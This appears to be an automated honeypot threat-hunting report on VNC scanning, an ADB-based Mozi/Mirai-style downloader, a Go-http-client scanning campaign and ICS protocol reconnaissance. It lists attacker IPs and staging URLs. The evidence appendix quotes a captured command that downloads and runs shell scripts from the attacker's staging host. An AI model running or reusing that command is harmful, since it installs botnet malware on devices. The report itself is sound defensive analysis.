# Investigation Report: Threat Hunting Analysis (2026-03-11T00:00:06Z to 2026-03-11T04:00:06Z)

## 1) Investigation Scope
- **investigation_start:** 2026-03-11T00:00:06Z
- **investigation_end:** 2026-03-11T04:00:06Z
- **completion_status:** Complete
- **degraded_mode:** true
  - Several backend search queries failed due to incorrect field names, requiring retries with corrected parameters. This delayed but did not block the investigation.

## 2) Executive Triage Summary
- **Top Services of Interest:** VNC (5900), Android Debug Bridge (ADB/5555), Web Services (8080, 15671, 2181, 9200), and Industrial Control System (ICS) protocols (Kamstrup).
- **Top Confirmed Known Exploitation:** A massive scanning campaign targeting VNC port 5900 was identified, directly mapping to a known authentication bypass vulnerability, **CVE-2006-2369**.
- **Top Unmapped Exploit-like Items:** A multi-faceted campaign was uncovered, originating from the initial detection of an ADB-based downloader. This campaign utilizes consistent tooling (`Go-http-client/1.1`) to scan for a wide range of services, including ADB, Apache Solr, Docker Registry, and other web application endpoints.
- **Botnet/Campaign Mapping Highlights:**
    - An Adbhoney detection was positively identified by OSINT as part of a **Mozi/Mirai-like** IoT botnet, using known staging infrastructure (`94.156.152.233`).
    - The deep investigation linked the initial ADB attacker to a much broader **spray campaign** characterized by a common User-Agent and a concentration of source IPs within a single ASN (AS14061 - DigitalOcean).
- **Major Uncertainties:** The specific intent behind reconnaissance of ICS protocols (`kamstrup_protocol` and the unknown `guardian_ast`) remains unclear.

## 3) Candidate Discovery Summary
The initial triage identified three primary areas of interest from over 60,000 events:
- **(BOT-01) Adbhoney Downloader:** Detection of a command to download and execute shell scripts from a remote server.
- **(BOT-02) VNC Scanning:** A high-volume scanning campaign targeting VNC services.
- **(ODD-01) ICS Protocol Reconnaissance:** Interaction with the Conpot honeypot using Kamstrup smart meter protocols.
A query to aggregate Conpot protocols initially failed but was successfully worked around by pivoting on the honeypot type, ensuring no loss of evidence.

## 4) Emerging n-day Exploitation
No activity corresponding to recently disclosed n-day vulnerabilities was identified in this investigation window.

## 5) Novel or Zero-Day Exploit Candidates
No candidates were classified as Novel or Potential Zero-Day. The most interesting candidate (BOT-01) was linked to an established malware family (Mozi/Mirai) through OSINT validation, reducing its novelty. The associated activity was reclassified as a Botnet/Campaign finding.

## 6) Botnet/Campaign Infrastructure Mapping

### Item: Multi-TTP Scanning Campaign (Go-http-client)
- **item_id:** DEEP-INV-01 (derived from candidate BOT-01)
- **campaign_shape:** spray
- **suspected_compromised_src_ips:** `91.224.92.196`, `134.122.95.3`, `134.209.78.215`, `137.184.197.230`, `137.184.201.88`, `143.198.176.235`, `176.65.149.180`, `185.215.165.35`
- **ASNs / geo hints:** Strong concentration in **AS14061 (DigitalOcean, LLC)** with other sources in AS51167 (Contabo GmbH) and AS209605 (UAB Host Baltic).
- **suspected_staging indicators:**
    - **Initial Downloader URL:** `http://94.156.152.233/bins/w.sh`, `http://94.156.152.233/bins/c.sh` (IP: `94.156.152.233`, AS214209, Bulgaria)
    - **Shared Tooling:** `Go-http-client/1.1` User-Agent observed across all source IPs.
- **suspected_c2 indicators:** None explicitly identified. The staging host `94.156.152.233` acts as a malware distribution point.
- **confidence:** High
- **operational notes:** This is a coordinated campaign using common tooling to scan for multiple, distinct vulnerabilities (ADB, Apache Solr, web apps). The shared User-Agent and concentration of IPs in AS14061 are strong pivots for monitoring and containment. OSINT confirms the initial staging host is associated with the Mozi/Mirai botnets.

## 7) Odd-Service / Minutia Attacks

### Item: ICS Protocol Reconnaissance
- **service_fingerprint:** `kamstrup_protocol` / `guardian_ast`
- **why it’s unusual/interesting:** Direct interaction with protocols used by Industrial Control Systems (specifically, smart meters), which is less common than typical web or SSH scanning.
- **evidence summary:** 62 events recorded by the Conpot honeypot from sources including `3.129.187.38` (AS16509, Amazon) and `198.235.24.58`. OSINT confirms Conpot emulates the Kamstrup protocol, but no specific vulnerability has been identified. The `guardian_ast` protocol remains undocumented in public sources.
- **confidence:** Medium
- **recommended monitoring pivots:** Monitor source IPs (`3.129.187.38`, `198.235.24.58`, `205.210.31.181`) for any follow-on activity or attempts to interact with other ICS-related services.

## 8) Known-Exploit / Commodity Exclusions
- **VNC Auth Bypass Scanning (CVE-2006-2369):** Over 22,000 events, primarily from `185.231.33.22` (AS211720), targeting port 5900. This is mass scanning for a well-known, 20-year-old vulnerability.
- **Credential Noise:** Standard brute-force attempts on SSH using common usernames (`root`, `admin`, `ubuntu`) and weak passwords (`123456`, `password`).
- **Generic Web Scanning:** Tanner honeypot observed common scanning for sensitive files like `/.env` and `/.git/config`.

## 9) Infrastructure & Behavioral Classification
- **Multi-TTP "Go-http-client" Campaign:**
    - **Behavior:** Exploitation (ADB) and broad Scanning (Solr, Web Apps).
    - **Shape:** Spray (multiple sources, multiple targets).
    - **Infra Reuse:** High (shared `Go-http-client/1.1` UA, concentration in AS14061).
    - **Services:** ADB (5555), HTTP (8080, and others), Apache Solr (15671, 2181, 9200).
- **VNC Scanning Campaign:**
    - **Behavior:** Scanning.
    - **Shape:** Spray (massive volume from one primary IP).
    - **Infra Reuse:** Low (single-purpose scanner).
    - **Services:** VNC (5900).
- **ICS Reconnaissance:**
    - **Behavior:** Scanning / Reconnaissance.
    - **Shape:** Spray (multiple sources).
    - **Infra Reuse:** Low.
    - **Services:** `kamstrup_protocol`, `guardian_ast`.

## 10) Evidence Appendix

### Multi-TTP Scanning Campaign (DEEP-INV-01)
- **Source IPs:** `91.224.92.196` (2), `137.184.201.88` (9), `137.184.197.230` (3), `134.209.78.215` (3), `134.122.95.3` (3), `143.198.176.235` (3), and others.
- **ASNs:** AS14061 (DigitalOcean, LLC), AS209605 (UAB Host Baltic).
- **Target Ports/Services:** 5555 (ADB), 8080, 15671, 8265, 9200, 2181.
- **Paths/Endpoints:** `/bins/w.sh`, `/bins/c.sh`, `/login`, `/api/version`, `/cgi-bin/authLogin.cgi`, `/v2/_catalog`, `/solr/admin/info/system`, `/solr/admin/cores?action=STATUS&wt=json`.
- **Payload/Artifact Excerpts:**
    - `cd /data/local/tmp/; busybox wget http://94.156.152.233/bins/w.sh; sh w.sh; curl http://94.156.152.233/bins/c.sh; sh c.sh`
    - User-Agent: `Go-http-client/1.1`
- **Staging Indicators:** `94.156.152.233` (AS214209).

### ICS Protocol Reconnaissance (ODD-01)
- **Source IPs:** `3.129.187.38` (30), `198.235.24.58` (19), `205.210.31.181` (4).
- **ASNs:** AS16509 (Amazon.com, Inc.).
- **Target Ports/Services:** 1025 (and others, via Conpot emulation).
- **Payload/Artifact Excerpts:** `b'000e0401040302010203040105010601ff01'` (Kamstrup protocol interaction).

## 11) Indicators of Interest
- **Staging Host IP:** `94.156.152.233`
- **Staging Host URLs:** `http://94.156.152.233/bins/w.sh`, `http://94.156.152.233/bins/c.sh`
- **Campaign User-Agent:** `Go-http-client/1.1`
- **Campaign Source IPs (High Confidence):** `91.224.92.196`, `137.184.201.88`, `137.184.197.230`, `134.209.78.215`, `134.122.95.3`, `143.198.176.235`
- **Campaign-related Paths:** `/solr/admin/info/system`, `/cgi-bin/authLogin.cgi`
- **Commodity VNC Scanner IP:** `185.231.33.22`

## 12) Backend Tool Issues
- **CandidateDiscoveryAgent:** The `two_level_terms_aggregated` tool failed to aggregate on `conpot.protocol.keyword`. The agent successfully used a workaround by pivoting on `type: 'ConPot'` to identify the relevant source IPs.
- **CandidateValidationAgent:** The `two_level_terms_aggregated` tool failed to find correlations for `http.url` or `http.url.keyword`. This weakened the initial validation of the campaign's "spray" shape.
- **DeepInvestigationAgent:** The `kibanna_discover_query` tool initially failed on a User-Agent search using `http.user_agent.keyword`. The agent identified the correct field was `http.http_user_agent.keyword` and retried successfully on the next iteration.
- **Conclusion Impact:** These issues caused minor delays but did not prevent the overall investigation from reaching a confident conclusion. The core findings were validated through alternative queries and pivots.

## 13) Agent Action Summary (Audit Trail)

- **agent_name:** ParallelInvestigationAgent
- **purpose:** Establish a baseline understanding of activity in the time window.
- **inputs_used:** Time window.
- **actions_taken:** Ran parallel queries for total attacks, top IPs/countries/ASNs, known CVEs/signatures, credential stuffing, and honeypot-specific interactions.
- **key_results:**
    - Identified 60,686 total events.
    - Highlighted massive activity from `185.231.33.22` on port 5900.
    - Mapped high-volume alerts to VNC (`CVE-2006-2369`).
    - Detected Adbhoney downloader commands and Conpot ICS interactions.
- **errors_or_gaps:** None.

- **agent_name:** CandidateDiscoveryAgent
- **purpose:** Identify and triage high-signal leads for validation.
- **inputs_used:** Outputs from ParallelInvestigationAgent.
- **actions_taken:** Aggregated honeypot data to find unique, recurring behaviors. Created three candidates (BOT-01, BOT-02, ODD-01) based on Adbhoney, VNC, and Conpot activity.
- **key_results:** Produced 3 distinct candidates for further investigation.
- **errors_or_gaps:** A `two_level_terms_aggregated` query on a Conpot protocol field failed, but was successfully worked around.

- **agent_name:** CandidateValidationLoopAgent
- **purpose:** Perform initial validation of discovered candidates.
- **inputs_used:** Candidate `BOT-01`.
- **actions_taken:** Ran 1 iteration. Validated the Adbhoney downloader command from `BOT-01`. Searched for known signatures related to the staging host `94.156.152.233` and payload `w.sh` (none found).
- **key_results:** Confirmed `BOT-01` was not associated with existing signatures, increasing its initial novelty score.
- **errors_or_gaps:** Loop was paused for deep investigation after the first candidate. A query to find other IPs using the same staging URL failed, weakening the initial assessment of the campaign's shape.

- **agent_name:** DeepInvestigationLoopController
- **purpose:** Conduct an in-depth, iterative investigation based on the most promising validated candidate.
- **inputs_used:** Validated candidate `BOT-01`.
- **actions_taken:** Ran 7 iterations.
    - Iteration 1: Pivoted on staging host `94.156.152.233`.
    - Iteration 2: Pivoted on source IP `91.224.92.196`.
    - Iterations 3-4: Pivoted on web activity on port 8080, identifying the `Go-http-client/1.1` User-Agent.
    - Iteration 5-6: Pivoted on the User-Agent, uncovering a wider spray campaign scanning for Solr and other web vulns.
    - Iteration 7: Pivoted on the Solr signature, confirming multiple new attacker IPs.
- **key_results:** Successfully connected an initial ADB exploit to a broader, multi-TTP scanning campaign using shared tooling. Exited the loop after establishing the core behavior of the campaign.
- **errors_or_gaps:** Stalled once due to an incorrect User-Agent field name in a query, which was corrected in the next iteration.

- **agent_name:** OSINTAgent
- **purpose:** Enrich and validate findings with open-source intelligence.
- **inputs_used:** Key artifacts from `BOT-01`, `BOT-02`, and `ODD-01`.
- **actions_taken:** Performed web searches for staging URLs, CVEs, protocols, and IPs.
- **key_results:**
    - Confirmed `http://94.156.152.233/bins/w.sh` is a known malware dropper for Mozi/Mirai.
    - Confirmed `CVE-2006-2369` is a well-known, old VNC vulnerability.
    - Confirmed Conpot's emulation of the `kamstrup_protocol`.
- **errors_or_gaps:** No public information was found for the `guardian_ast` protocol.

- **agent_name:** ReportAgent
- **purpose:** Compile the final report from all workflow state outputs.
- **inputs_used:** All previous agent outputs.
- **actions_taken:** Assembled this markdown report.
- **key_results:** Generated the final investigation summary.
- **errors_or_gaps:** None.

- **agent_name:** SaveReportAgent
- **purpose:** Save the generated report file.
- **inputs_used:** Final markdown report content.
- **actions_taken:** The report content is now being passed to the `deep_agent_write_file` tool.
- **key_results:** Report will be saved.
- **errors_or_gaps:** None.
